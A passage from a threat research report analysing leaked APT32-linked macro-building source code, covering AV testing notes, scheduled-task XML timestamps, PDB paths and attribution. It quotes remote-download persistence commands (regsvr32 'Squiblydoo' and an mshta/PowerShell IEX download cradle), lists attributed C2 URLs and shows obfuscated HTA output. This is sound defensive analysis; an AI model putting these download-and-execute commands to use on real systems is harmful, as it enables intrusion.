the risk of accidentally leaking a final payload. The careful handling does not necessarily imply that they are an apex predator, yet it shows that this developer took some basic steps to avoid accidentally leaking sensitive information. But no matter the sophistication, malware developers are always human, and all humans make mistakes.The typical VB macro content For most of the macro content across all the StrikeSuit Gift projects, the macros were mainly used to create scheduled tasks that would download additional payloads in a couple of ways. One way uses the regsvr32.exe remote download technique that is sometimes referred to as “Squiblydoo.”sCMDLine = ""schtasks /create /sc MINUTE /tn """"Windows Media Sharing"""" /tr """"\""""regsvr32.exe\"""" /s /n /u /i:url scrobj.dll"""" /mo AAAREGSVR32AAA""The other way uses an XML scheduled task with rundll32.exe and arguments to have mshta execute VB script that would run a PowerShell download.2504/2022The origin story of APT32 macros THREAT RESEARCH REPORT<Command>rundll32.exe</Command> <Arguments>mshta vbscript:Execute(""CreateObject(""WScript.Shell"").Run""powershell.exe -nop -w hidden -c """"IEX ((new-object net.webclient).downloadstring('url"""""", 0:code close"")</Arguments>2604/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter IV2704/2022The origin story of APT32 macros THREAT RESEARCH REPORTStrikeSuit malware development conventions When reacting to intrusions and campaigns around the world, analysts and researchers are often left to speculate on the adversary’s capabilities, the tradecraft involved, and the details surrounding the original malware development environment. However, when we have the source code, we get a better picture of what was going on behind the scenes. What we see here largely matches our expectations, and yet we learn that malware developers are really no different than your everyday software developers.Documenting antivirus and compatibility testing Whether you work in IT or in a SOC, whether you throw down on NTFS or pcap, whether you work in Sublime or VS Code, you are probably stuck in a world of note-taking, testing, and documentation. Those developing malware face the same challenges in terms of planning, assessing efficacy, and tracking bugs and enhancements over time. In the StrikeSuit Gift package, we see evidence of the malware development team performing testing of Office documents on a select set of antivirus solutions. The verbatim excerpt below is from the file AVs-Test/Result.txt and demonstrates that this developer’s macro solution was absolutely crushing AV as of August 24, 2017.* AV update ngay 2017/08/24- 360 CN - 360 Total Security - Windows DefenderOffice 2010 x86OOOOO OTrojan-Downloader.Script.GenericO O2804/2022The origin story of APT32 macros THREAT RESEARCH REPORTMany of these names you are familiar with and some acronyms for household names. For those that aren’t obvious, KIS is likely Kaspersky, and NIS is probably Norton. It’s worth highlighting two lesser-known names in the list above:● BKAV may be a reference to Bkav Corporation which is one of the more popular antivirusproviders in Vietnam (url● CMC may be a reference to CMC Cyber Security, another Vietnam-centered antivirus provider(url antivirus testing, we see that the malware developers were assessing compatibility with a handful of Microsoft Office versions. The excerpt below is from Office-Versions/Verions.txt, and it is clear that the tooling needs some enhancements.Work: - Office 2010 x86 - Office 2013 x86 - Office 2016 x86Fail: - Office 2010 x64 (Type mismatch) - Office 2013 x64 (Type mismatch) - Office 2016 x64 (Type mismatch)Feature testing, housekeeping, and fingerprints Throughout the source codebase we see common conventions of software development. Malware developers face many of the same technological and organizational challenges as any software developer. They need to test small features and build incremental capabilities that work together. They need to keep their folder trees tidy, and they need to back up their code in case they make any catastrophic mistakes. They need to keep track of their tasks, their OKRs, and MBOs. They’re doing the same job, just on the other side of the grind. They’re only human, and accordingly, they can’t help but leave dirty fingerprints across all their digital work.Cleaning up the development mess with _Cleanup.bat Along with the Macros_Builder project, we find a batch file named _Cleanup.bat that appears designed to delete unnecessary artifacts from the development system. According to 7-zip, the last2904/2022The origin story of APT32 macros THREAT RESEARCH REPORTmodified time is sometime around 2013-10-29 00:18, so perhaps this cleanup script was used and copied around from drive to drive, project to project, to allow the developers to quickly scrub their workstations or directories as needed. File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\Macros_Builder\ File Name: _Cleanup.bat File Size: 3840 This excerpt of _Cleanup.bat begins with a warning, and a commented out loop for deleting Visual Studio Solutions User Options (.SUO  files, after which there is a long list of for loops with different files to delete.@echo off echo Warning!! This file can delete wanted/needed files! Use with caution! echo Hit enter to continue using this file, or close it if you do not want to run it. REM pausefor /f ""tokens=1 delims="" %%a in ('dir /b /s *.ncb') do ( del /Q ""%%a"" echo %%a deleted. )REM Dont delete config of VS REM ///////////////////////////////////////////////////////////////////////// REM for /f ""tokens=1 delims="" %%a in ('dir /b /s /A:H *.suo') do ( REM attrib -H ""%%a"" REM del /Q ""%%a"" REM echo %%a deleted. REM ) REM /////////////////////////////////////////////////////////////////////////Neither the exact batch scripting nor the file types are particularly illuminating. This doesn’t look like a malware developer “covering their tracks” but rather a tidy programmer wanting an easy, scriptable way to delete chaff that may come from different versions of Visual Studio and different linkers and compilers and code artifacts that span many generations of development technology.3004/2022The origin story of APT32 macros THREAT RESEARCH REPORTFile names or extensionsNote*.ncb*.suo*.tlh*.tli*.sdf*.userVisual C   IntelliSense DatabaseVisual Studio Solutions User Options (excluded)C/C   Type Library HeaderC/C   Type Library ImplementationVisual Studio Code Browser DatabaseVisual Studio User Options*BuildLog.htmVisual Studio Build Log (pre-VS2010 *.ilk*.pdb*.idb*.obj*.pch*.ipch*.tlogVisual Studio Incremental LinkingProgram Database/Debug SymbolsVisual Studio Intermediate Debug FileVisual Studio ObjectPrecompiled HeaderIntelliSense Precompiled HeaderMSBuild File Tracker Log*.vshost.exeVisual Studio Hosting IDE Process*.vshost.exe.configVisual Studio Hosting IDE Process*.vshost.exe.manifestVisual Studio Hosting IDE Process*.old*.stdafx.obj*.exp ? Visual Studio Precompiled Header ObjectExported Functions Data*.Build.CppClean.logCPPClean Task Log  ? 3104/2022The origin story of APT32 macros THREAT RESEARCH REPORT*.lastbuildstateMSBuild  ? *.intermediate.manifestVisual Studio Manifest*.embed.manifestVisual Studio Manifest*.embed.manifest.resVisual Studio Manifest*mt.dep*.Cache*Properties.Resources.resou rces*Form1.resources*csproj.FileList.txtVisual Studio ManifestVisual StudioVisual StudioVisual StudioVisual Studio*.csproj.FileListAbsolute.txtVisual Studio*.sbr*.bscVisual Studio Intermediate Symbolic DataVisual Studio Browser Symbol DataWe couldn’t find much evidence of this batch file in other places, but we came up lucky on a Github search and arrived at this page, which has a nearly word-for-word copy of the batch script functionality: url There are only slight differences between StrikeSuit’s _Cleanup.bat and aangaymoi’s .sln.clean.bat script. The former has the .SUO loop commented out and was present back in 2017, whereas the latter was saved to Github in 2021 and does not exclude the .SUO deletion. Still, in the StrikeSuit Gift package, it seems as though the _Cleanup.bat script was never run. So, we will let this investigative thread dangle in the wind for now and move on to look at the artifacts of the development process such as the .SUO files.Visual Studio Solution User Options (.suo) analysis We were lucky enough to capture a copy of the source code package before the _Cleanup.bat script was run, so we obtained copies of lots of nitty-gritty files that come along with Visual Studio development, including Solution User Options (.suo) files. This is uncommon, and these files are not3204/2022The origin story of APT32 macros THREAT RESEARCH REPORTparsed by common aftermarket tooling, so we are left exploring the data structures to look for interesting tidbits that we might tease out of the saved states of each of the solutions. navigate through the portions of the SUO data structure.3304/2022The origin story of APT32 macros THREAT RESEARCH REPORTRunning through all the SUO file structures is laborious and didn’t yield much more than a string dump would have done anyway. We find paths to source code files, project names, etc. We can infer from the myriad of references in XmlPackageOptions, OutliningStateDir, etc., that the HtaDotnet and ShellcodeLoader solutions were originally under the folder path G:\WebBuilder\Gift_HtaDotnet\. This is also supported by the PDB paths of older built binaries within the broader StrikeSuit Gift package. From looking at DebuggerWatches values in other projects, we can see that the malware developer was actively debugging the historical programs.SUO fileDebuggerWatchesWebBuilder/HtaDotNet/HtaDotnet.v11.suoWebBuilder/ShellcodeLoader/.vs/L/v14/.suoWebBuilder/ShellcodeLoader/L.suoresult(char)77(char)773404/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe examination of SUOs was a fruitless exercise and something of a dead end, but it was an important one to capture. Not all investigative threads turn up DNA and fingerprints. Sometimes they are just another vignette and another ephemeral glimpse into the elusive life of a malware author. There’s nothing mind-blowing from this SUO inspection because these structures do not give us any great insights that the source code does not already provide. However, should you happen to find .SUO files without accompanying source code, these files could be rich in information about the Visual Studio solution, the malware author, or the original development environment.Development in progressTesting features and functions Analysis of this source code package is messy because it is non-linear and involves multiple timelines. Still, we see the iterative nature of development and how the malware authors tried and tested small capabilities before integrating them into other projects. Development was clearly in progress at the time this package was leaked, and we can see a few examples of this. For example, XmlStrAnalyst was a simple VB project to write an XML scheduled task to disk. This project was built around 8/16/2017. It appeared as a precursor to the functionality that was later pushed as an enhancement into the updated version of Macros_Builder, which was modified to use XML scheduled tasks.Backup structure Obviously, when you expand upon a piece of older code that works, you don’t want to mess it up with alterations. What’s the first thing you do? You back it up! The malware developer working on this project created archive copies of WebBuilder.rar and Macros_Builder.zip to protect these older, working projects.Macro comparisons There were two different versions of MacrosSource.txt in the source code package. We see active development and testing of the macro content through diffing these files.3504/2022The origin story of APT32 macros THREAT RESEARCH REPORTPath in P17028   StrikeSuit Gift   Office Macro Type 1\Reference\SizeRAR mod timestampMacros_Builder\Macros_Builder\MacrosSource.txt140573/10/2016 23:40:00Macros_Builder\Macros_Builder\bin\Debug\MacrosSource.txt182197/19/2016 21:34:00Using Visual Studio Code’s built-in comparison capability, we can highlight the line-by-line differences in these two files. The most notable difference is that the more recently modified MacrosSource.txt has adjustments to SpawnBase63 procedure to include incorporating an XML scheduled task for persistence and execution of the remote download. This change was made partially because the Macros_Builder program has a modified add_schedule_vba.txt, which is the source for the macro content. It seems as though the developer ran the debug build of this program with input to the GUI, leaving us some juicy network toolmarks of a C2 server that may have been used during testing. How exciting!We know. But hold your horses; we will dive into these details soon.3604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThere are also two copies of add_schedule_vba.txt, one of which is in an older zip archive of the Macros_Builder project. The only change in this file was the addition of additional quotation marks in the XMLStr macro arguments for the PowerShell download. Development was obviously in progress.Path in P17028   StrikeSuit Gift   Office Macro Type 1\Reference\SizeModified timeMacros_Builder.zip\Macros_Builder\Resources\add_schedule_v ba.txt181159/08/2016 03:44:00Macros_Builder\Macros_Builder\Resources\add_schedule_vba.t xt181338/17/2017 21:23:003704/2022The origin story of APT32 macros THREAT RESEARCH REPORTBorrowed and repurposed open-source code The last piece of assessing the totality of this source code was to look at the various solutions, projects, and components, and then think about which pieces were borrowed or “liberated” from open source code projects. While this may not shed light on the future of the malware projects we see here, understanding the use of public code speaks to the developers' inspiration.FilesNotesVB/ShellcodeLoader/- ShellcodeLoader.vbThese pieces contain age-old macro content with variable names originally generated by scriptjunkie and used in a 2012 blog post.CSharp/VbaCodeCreator- vba_code_builder.txtMacros_Builder- add_schedule_vba.txtThis exact code, with randomized variables Zopqv Hyeyhafxp Xlbufvetp, etc., are used verbatim across many derivative projects (rather than generating original VB code from MSF . So, it may not be directly sourced from this blog, but it is clear that the code was not generated using meterpreter by the developer. It obviously was copypasta’d from somewhere around the internet.Vba_code_builder.txt uses the same VBA7 top block with variables Zopqv Dkhnszol and so forth but then uses some variables to replace with shellcode substitutions. These are later replaced in Core.csBase64Encode2 and other functions taken directly from this text file.Types STARTUPINFO and SECURITY_ATTRIBUTES and more could have been taken directly from ancient VB samples like this one.3804/2022The origin story of APT32 macros THREAT RESEARCH REPORTWebBuilder/HtaDotNet- HtaDotnet.csWebBuilder/ShellcodeLoader /Test- Program.csMacros_Builder/- _Cleanup.batThese pieces contain several function names originally seen in James Forshaw’s DotNetToJScript, such as Deserialize_2 BuildLoaderDelegate, etc. (here and here).This cleanup script does not have much public presence, or at least not much that is easily searchable. But in February 2021, a very similar script showed up on Github.3904/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter V4004/2022The origin story of APT32 macros THREAT RESEARCH REPORTStockpiling the unique toolmarks and indicators If you’ve made it this far in the story, you are desperately aching to see connections to APT32. But don't rush this! Let the suspense wash over you and enjoy this moment. This is the job, and we’re taking our sweet time with it. Before we hit you with the attribution angles, let’s reassess the surface area of all this data and bubble up the unique values that could be helpful in searching for connections. To get us started, we searched through all of the files, source code, notes, and compiled builds, and extracted toolmarks, names, file paths, IP addresses, GUIDs, timestamps, and other dirty developer fingerprints.Usernames, handles, and hostnames We extracted a variety of usernames and handles from the various files. It is clear that there are a couple of players at work here, though we do not get much information beyond simple names and a default Windows hostname.NamestoxicRachaelArnoldNotesReadMe.txt, with open date of 2017 08 11From PDB paths and test paths inside source codeAuthor name in test.doc created 2017:08:25 08:30:00WIN-FF211E5QDM2\RachaelEmbedded in XmlStr.txt after Rachael executed XmlScriptAnalyst.exeDistinct macro timestamps from a scheduled task XML file Seven digit decimals in a timestamp One oddly notable project in the StrikeSuit Gift package is XmlStrAnalyst, which seems to be a test for building or modifying XML scheduled tasks. It uses VB code to write to an outfile XmlStr.txt. Looking at the top of the XmlStr.txt document, we see it is indeed raw XML for a Windows scheduled task. What stands out immediately are unique timestamps that speak to the potential age of the original malware development.4104/2022The origin story of APT32 macros THREAT RESEARCH REPORT<?xml version=""1.0"" encoding=""UTF-16""?> <Task version=""1.2"" xmlns=""url""> <RegistrationInfo><Date>2016-06-02T11:13:39.1668838</Date> <Author>WIN-FF211E5QDM2\Rachael</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval>PTBBBPOWERBBBM</Interval> <StopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary> <Enabled>true</Enabled></TimeTrigger></Triggers>These hard-coded timestamps are observed in both Macros_Builder’s add_schedule_vba.txt and XmlScriptAnalyst’s Module1.vb. They are subsequently written into MacrosSource.txt and XmlStr.txt when Macros_Builder.exe or XmlScriptAnalyst.exe are executed, respectively. It may be worthwhile to note that these are unique timestamps, and at first glance, it seems odd that the timestamps have seven digits of precision after the seconds value. With seven digits, we know it’s not milliseconds, it's not microseconds, it’s not nanoseconds. So how exactly did these seven-digit timestamps get made, anyway? We presume it has to be created by Windows, somehow.● 2016-06-02T11:13:39.1668838 ● 2016-06-02T11:12:49.4495965Testing the export of scheduled tasks XML The simplest explanation for the timestamps above is that before this was put into any VB script or Visual Studio solution, the malware developer created and exported an XML scheduled task using the Windows Task Scheduler. They used that as a template for the Macros_Builder and XmlScriptAnalyst projects. To test this theory, we jump into a VM and try to recreate how a malware author might create and export the Scheduled Task XML. Step 1  Using the Windows Task Scheduler, we create a test task.4204/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep 2  We create a trigger to initiate the task once, and then we select the repeat task every one hour and set the duration to Indefinitely. Note that the start time we select here will be 2022 03 02 at 8 41 05AM  EST in our Virtual Machine).4304/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep 3  We create an action for the task to run rundll32.exe with arguments to execute a VB scriptlet.Step 4  We finalize the Scheduled Task, then right-click the task entry and export to an XML file.4404/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep 5  We view the exported scheduled task XML and see that it indeed contains the date timestamps with seven points of decimal precision. Further, we see that the Task Scheduler embeds the author computer name and username in our test file. We confirm that the RegistrationInfo Date timestamp is when we created the task, and the Trigger StartBoundary timestamp is when our task is set to begin. What a joyous day.<?xml version=""1.0"" encoding=""UTF-16""?> <Task version=""1.2"" xmlns=""url""><RegistrationInfo><Date>2022-03-02T08:43:01.7591912</Date> <Author>user-PC\user</Author></RegistrationInfo> <Triggers><TimeTrigger><Repetition><Interval>PT1H</Interval> <StopAtDurationEnd>false</StopAtDurationEnd></Repetition> <StartBoundary>2022-03-02T08:41:05.5580189</StartBoundary> <Enabled>true</Enabled></TimeTrigger></Triggers>4504/2022The origin story of APT32 macros THREAT RESEARCH REPORT<Principals><Principal id=""Author""><UserId>user-PC\user</UserId> <LogonType>InteractiveToken</LogonType> <RunLevel>LeastPrivilege</RunLevel></Principal></Principals> <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries> <AllowHardTerminate>true</AllowHardTerminate> <StartWhenAvailable>false</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle></IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>P3D</ExecutionTimeLimit> <Priority>7</Priority></Settings> <Actions Context=""Author""><Exec><Command>rundll32.exe</Command> <Arguments>mshta vbscript:Execute(""CreateObject(""WScript.Shell"").Run""powershell.exe -nop -whidden -c """"IEX ((new-object net.webclient).downloadstring('url"""""", 0:code close"")</Arguments></Exec></Actions></Task>The XML for a Scheduled Task is not generated unless you export it, so we can guess that Windows is storing the information used to create the XML somewhere in the registry. Using regedit.exe, we pull up HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\ to browse around Tasks keys. We see that there is a registry key for our Time Test Task, where the DynamicInfo key stores what is likely to be our StartBoundary timestamp.4604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThis value 1E7B9C6F3B2ED801 is a Windows FILETIME, a 64-bit structure containing the number of 100-nanosecond intervals since Jan 1, 1601. Using CyberChef, we can convert 1E7B9C6F3B2ED801 to a more human-readable format using the Windows FILETIME to UNIX Timestamp operation, which confirms this hex value is 2022-03-02 at 13:43:01 UTC (or 8 43 AM EST . In Windows, w32tm.exe takes 10^ 7s  100 nanoseconds) intervals and converts to a readable format. The value 1E7B9C6F3B2ED801 in Int64 is 132907021817903902. Passing that value into w32tm.exe gives us this:C:\Users\user\Desktop>w32tm.exe /ntte 132907021817903902 153827 13:43:01.7903902 - 3/2/2022 1:43:01 PMOf course, after doing all of that, we find out there is an easier way. We can pass the byte flipped hex of the original value:C:\Users\user\Desktop>w32tm.exe /ntte 0x01D82E3B6F9C7B1E 153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM4704/2022The origin story of APT32 macros THREAT RESEARCH REPORTWell, we can see that w32tm.exe presents this timestamp to us just like we expected and with the expected seven digits of precision. However, it is unclear how or why the last 7 digits differ from what we see in our XML timestamp. Naturally, as with all things in digital forensics, you have to know what your tools are doing behind the scenes to understand if they are summarizing or truncating numbers and to what degree of specificity, let alone the correct time offset. Timestamps, amirite?Developer fingerprints in scheduled task XML When we switch back to looking at XmlStr.txt, we see that this XML contains the original malware developer’s computer name, user name, and timestamps that likely indicate the approximate date on the development system when the XML script content was originally created, around the time it was used to create macros in the 2016 version of Macros_Builder.<?xml version=""1.0"" encoding=""UTF-16""?> <Task version=""1.2"" xmlns=""url""> <RegistrationInfo><Date>2016-06-02T11:13:39.1668838</Date> <Author>WIN-FF211E5QDM2\Rachael</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval>PTBBBPOWERBBBM</Interval> <StopAtDurationEnd>false</StopAtDurationEnd></Repetition><StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary> <Enabled>true</Enabled></TimeTrigger></Triggers>One final nugget of interest is the interval value PTBBBPOWERBBBM. This is a value that was altered from the original exported XML to be a placeholder value that would be changed depending on values entered in the GUI of the Macros_Builder program. Except this value is never referenced. Instead, Macros_Builder Form1.cs checks the macro content to replace the value BBBPOWERBBB. This is one of many small errors that shows that the program is obviously undergoing development at the time of interception.4804/2022The origin story of APT32 macros THREAT RESEARCH REPORTIf you’re a seasoned Windows forensicator, you’re likely already familiar with Windows timestamp shenanigans, and none of this is new or surprising to you. So why should you care and why does any of this timestamp business matter? Well, seeing seven digits of precision in an XML scheduled task may indicate that it was created and exported by the Windows Task Scheduler. This structure of the timestamp can be used for detection purposes to highlight content that was generated with this approach.Network-based indicators The MacrosSource.txt file stored output from an execution of the newer debug build of Macros_Builder, leaving us these IP addresses that may have been used for the testing of the macro Several of the StrikeSuit Gift projects were compiled in debug mode, leaving us clear paths to the PDB symbol files, reflecting information about the original development directories. Though we cannot necessarily trust these timestamps to indicate the true original compile time, these paths and timestamps together paint a fuzzy evolutionary timeline from old to new code and capabilities.4904/2022The origin story of APT32 macros THREAT RESEARCH REPORThash.md5pe.timestamppe.pdb_path850b062d81975c43 6dc5d03d4053372f2008-09-01 18:48:30 (1220309310)2009-05-16 07:47:06 (1242474426)2009-05-16 07:47:14 (1242474434)2009-05-16 07:47:14 (1242474434)2009-05-16 09:44:30 (1242481470)2009-05-16 09:44:31 (1242481471)2009-05-16 09:44:40 (1242481480)g:\\WebBuilder\\Gift_HtaDotNet\\ShLdr\\obj\\Debug\\ShLd r.pdbG:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\Test\\ obj\\Release\\Test.pdbG:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\L\\obj \\Debug\\L.pdbG:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\Test\\ obj\\Debug\\Test.pdbg:\\WebBuilder\\Gift_HtaDotNet\\HtaDotNet\\HtaDotnet\\o bj\\Debug\\HtaDotnet.pdbg:\\WebBuilder\\Gift_HtaDotNet\\HtaDotNet\\Test\\obj\\D ebug\\Test.pdbg:\\WebBuilder\\Gift_HtaDotNet\\HtaDotNet\\Test\\obj\\R elease\\Test.pdbce985259ba7a962f 39c48f157e31f5aa2013-10-08 12:00:51 (1381248051)d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\MacrosEmbedding\\MacrosEmbedding\\ob j\\Debug\\MacrosEmbedding.pdb1a54a5af55fa7210 f0f6e7b8118661ff2013-10-08 12:08:52 (1381248532)d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\VbaCodeCreator\\VbaCodeCreator\\obj\ \Debug\\VbaCodeCreator.pdbd1c8da885b9f283c f2114e53fee43fe02016-01-26 04:18:22 (1453799902)d:\\Source\\visual\\Embed Office\\NtfsStreams\\Trinet.Core.IO.Ntfs\\obj\\Debug\\T rinet.Core.IO.Ntfs.pdbfeda9657a3861805 4fe95a07dad545982016-03-11 04:02:13d:\\Source\\visual\\Embed Office\\Office Macros\\Macros_Builder\\Macros_Builder\\obj\\Release\\M5004/2022The origin story of APT32 macros THREAT RESEARCH REPORT(1457686933)acros_Builder.pdb4bfb1d2889d29936 c72513c9e187937e2016-04-06 21:18:55 (1459991935)d:\\Source\\visual\\VBScript ADS Loader\\Macros_Builder\\Macros_Builder\\obj\\Debug\\Mac ros_Builder.pdbc0ea1573b006ab4b 419af0e6b29df5502016-07-20 00:32:49 (1468989169)d:\\Source\\visual\\VBScript ADS Loader\\Macros_Builder\\Macros_Builder\\obj\\Debug\\Mac ros_Builder.pdb8d74fc0ef81b32f7 3c0797ec2a03e6772017-08-14 00:31:58 (1502685118)D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\MacrosEmbeddingExample\\MacrosEmbedd ingExample\\obj\\Debug\\MacrosEmbeddingExample.pdbe1a3d0eb585567a6 9eb2a0606b622e102017-08-17 00:03:09 (1502942589)D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\VB\\XmlScriptAnalyst\\XmlScriptAnalyst\\obj\ \Debug\\XmlScriptAnalyst.pdbde1e7c29d98778fd 7fbb832bd599b3672017-08-17 04:18:44 (1502957924)d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\Macros_Builder\\obj\\Debu g\\Macros_Builder.pdbd4251964e97e7225 8be9cf1acf222bf32017-08-22 00:18:26 (1503375506)d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\WebBuilder\\ShellcodeLoader\\L\\obj\\Debu g\\L.pdb0f02cf16b466a7bd 2643ef01e09fc6d02017-08-22 00:18:30 (1503375510)d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\WebBuilder\\ShellcodeLoader\\Test\\obj\\D ebug\\Test.pdb84113138ed90ab30 3a4dd1eedc6a6f192017-08-23 04:44:28 (1503477868)D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\C_Cpp\\Binary\\Debug\\Binary.pdbe2a9f698cb6aa417 bae41ce02d0555da2017-08-23 07:01:51 (1503486111)D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\C_Cpp\\ShellcodeThreadCaller\\x64\\Debug\\Sh ellcodeThreadCaller.pdb77374f452700e17f 3fe8c959db3d9f232017-08-23 07:02:11 (1503486131)D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\C_Cpp\\ShellcodeThreadCaller\\Debug\\Shellco deThreadCaller.pdb5104/2022The origin story of APT32 macros THREAT RESEARCH REPORTThreadwork of attribution and assessing connections to APT32 Finally, after tedious inspection of this messy pile of data, we can take stock of our indicators, TTPs, and other pivots and align the StrikeSuit Gift package with public reporting of named threat actors. Attribution is a spectrum, of course, and along the axis of specificity there are different burdens of proof required to make an attribution. In our case, because we are assessing alignment with a large cluster that is not necessarily a real-life “group” but more a superset of intrusions that transcend years of activity, a preponderance of evidence will suffice. So, let’s begin with dumping a few of the most qualified data points that show connections to APT32 or OceanLotus.ShellcodeLoader L.dll package is the same hash as that which is mentioned in this RedDrip Team blog about OceanLotus. Beyond being simply the same hash, the StrikeSuit Gift project WebBuilder/ShellcodeLoader has all the technical hallmarks of being the source code for this loader, so that’s nice and convenient for us.ShellcodeLoader project showing TypeLib Id GUID, whichis the same as in theL.dll file THREAT RESEARCH REPORTXML timestamps There are more direct and obvious connections to APT32 (or OceanLotus) in the VB macro and XML scheduled tasks. A quick survey shows that the two XML timestamps observed across multiple projects in the StrikeSuit Gift package  StartBoundary 2016-06-02T11:12:49.4495965 and Date 2016-06-02T11:13:39.1668838) are seen in the macro content of hundreds of malicious documents.5304/2022The origin story of APT32 macros THREAT RESEARCH REPORTMany of these macros designate remote network resources attributed to APT32, OceanLotus, Cobalt Kitty, and so forth.Sample files containing StartBoundary and Date timestamps2016-06-02T11:12:49.4495965 and 2016-06-02T11:13:39.1668838, revealing many overlapswith APT32 and OceanLotus infrastructure.File MD5Example C2 address from macroC2 attribution33adc53121634127 picr.jpgAPT32  Mandiant)e334b21a2c52dcf8 a46990b47dfb4726http[:]//contay.deaftone.com/user/upload/i mg/icon.gif?n=%COMPUTERNAME%APT32  Mandiant)e47554108ef02e9c dc3a034fea1cb943http[:]//job.supperpow.com:80/pd/random1/r andpic/1.jpgAPT32  Mandiant)f87bab14791c3230 b43241500870b109\""h\""t\""t\""p://icon.torrentart.com:80/789. jpgAPT32  Mandiant)b7ee7947f9f01790 7f6a175da10a6bf0http[:]//chinanetworkvub.info:80/global/as 15daa274ec269bbehttp[:]//update-flashs.com/gpixel.jpgAPT32  Mandiant)http[:]//google-script.com/adobereg.binCobalt Kitty  CyberReason)e48cc615a4569175 b2ea144928d5b871http[:]//support.chatconnecting.com:80/pub lic/public_pics/rpic.jpgOceanLotus (blevene) Cobalt Kitty  CyberReason)ObfuscationHelper.csTaking a step beyond the comfortable immediacy of indicator links, we can take a gander at TTPs associated with StrikeSuit Gift and APT32 such as obfuscation methods. One of the interesting components of the StrikeSuit Gift package is a piece of source code smartly named ObfuscationHelper. Within the HtaDotnet package, the ObfuscationHelper.cs code does exactly what it sounds like it does, and has a bunch of functions to help provide jacked up strings when building HTA files with obfuscated macros. There are many layers to this onion. The ObfuscationHelper, though, uses arrays of vowels and consonants to build random strings with random casings that appear to be like words. For example, we can use the HtaDotnet project to build an HTA file and we might get code that looks something like this:Snippets of code extracted from a fabricated testHtaDotnet output .hta file.<HTA:APPLICATION iD=""KONG"" iCON=""#"" wINDOwstATE='mINiMize' sHOwINtAskbAR='No' /> <script language=""vbscript""> on ERror reSume Next HetGhonCosWewShiw=""ZXUWgQaHQl0qUbK9YHZROhNYn0jYAAEAAAD AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdG VTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZ""5504/2022The origin story of APT32 macros THREAT RESEARCH REPORTJepZacWimQuungGhun=""h6m1P3lqH0iwiS0xNaK,wUxEnHR2umtUEJmSvy,fHWQKsadnNWMoLi,4T83Ud8uQOLnzcSqqWAmta 9p5DAABAAAA wEAAAAAAAAABAEAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdG UHdGFyZ2V0MAdtZXRob2""… (truncated)FunctIoN QuudKisWhaw ( WhacThes)QuisVesGupYewFong = WhacThes QuisVesGupYewFong =ReplAce ( QuisVesGupYewFong ,"" "" , ""="")QuisVesGupYewFong= replACE( QuisVesGupYewFong ,""."" , ""/"") QuisVesGupYewFong = replAce ( QuisVesGupYewFong ,"","" , ""+"" )QuudKisWhaw= QuisVesGupYewFongENd FunCtIOn…(truncated)fuNCtIOn WhosChem ( YowDon , GongWiwFangLip ,GidRomShos ,CiwHap , KepChinGhop,GinChongYiwQuis)oN eRroR reSume NExTSet ShepWhud = COpquiwwHEnleT ( ""WScript.Shell"" ) ShepWhud.RegRead ""HKLM\SOFTWARE\Microsoft\.NETFramework\""+ YowDon+ ""\""…An analyst looking at just the HTA file might be quick to hone in on a couple of unique values such as <HTA:APPLICATION iD=""KONG"", but we can see in our source code that the value KONG is actually generated by the ObfuscationHelper.Code to create the randomized HTA header usingObfuscationHelperhtaAttr = ObfuscationHelper.RandomLowerUpperCase(""ID=\"""" + obs.RandomWords() + ""\"" icon=\""#\"" />"");The special sauce of ObfuscationHelper begins with three string arrays for vowels and consonants that are later used to build words, which are later checked against a list of special, reserved keywords for the VB macro. We notice that in CONSONANTS_1 there are a couple of duplicates, perhaps a copy/paste error. The vowels will be familiar to most, but how and why are these consonants selected?5604/2022The origin story of APT32 macros THREAT RESEARCH REPORTOn speculation, we may guess that these consonants (and digraph phonemes, representing small pieces of sound in speech) were selected to help fabricate fake strings that appear to be read like or sound like real language words. The selection of vowels and consonants allows the generation of strings with the right construction, though that is highly dependent on the language. For example, when considered phonetically, modern English commonly uses the phoneme ð (digraph “th”), whereas the phoneme ɣ (digraph “gh”) is not present. So what does this exact array of consonants 